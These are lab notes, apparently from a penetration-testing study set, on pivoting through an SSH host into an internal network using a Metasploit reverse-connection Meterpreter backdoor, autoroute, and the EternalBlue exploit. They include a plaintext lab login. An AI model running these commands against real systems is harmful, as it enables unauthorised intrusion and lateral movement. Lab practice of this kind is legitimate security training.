Meterpreter
===
🔙 [MENU README](./Pivot%20&%20Double%20Pivot.md)


# Enviroment
Parrot 
```bash
# eth0 : 192.168.0.18
# eth1 : 172.19.19.18
```
SSH
```bash
# eth0 : 192.168.0.70
# eth1 : 172.19.19.70
sudo ifconfig eth0 down
```
Windows 2008 (Web Server)
```bash
# eth0 : 192.168.0.7
# eth1 : 172.19.19.7
Disable 172.19.19.7
```

# MSF
![](./MSF.png)
```
Method:
1. SSH into the SSH Server and deploy a Meterpreter backdoor which connects back via a Reverse Connection
2. Once the session is established, configure Session Routing
```
```
MSF's autoroute module provides built-in routing and pivoting within Metasploit.
It adds a route to the internal subnet through the established Meterpreter session,
allowing Metasploit modules to reach otherwise inaccessible internal network resources.
As long as the route is reachable, MSF can be used directly for internal scanning and exploitation.
```
SSH
```bash
msfconsole -q
# msf
use exploit/multi/ssh/sshexec
set lhost 192.168.0.18
set rhosts 172.19.19.70
set username administrator
set password Infinit3
exploit
# meterpreter
shell
```
**Session-Routing**
```bash
run get_local_subnets
run post/multi/manage/autoroute OPTION=s
run autoroute -p  #gateway : Session1
background


# You can also use "route add" to configure routing
```
MS17_010
```bash
search ms17_010
use exploit/windows/smb/ms17_010_eternalblue
show options
set rhosts 192.168.0.7
set lhost  172.19.19.18
check
exploit
```

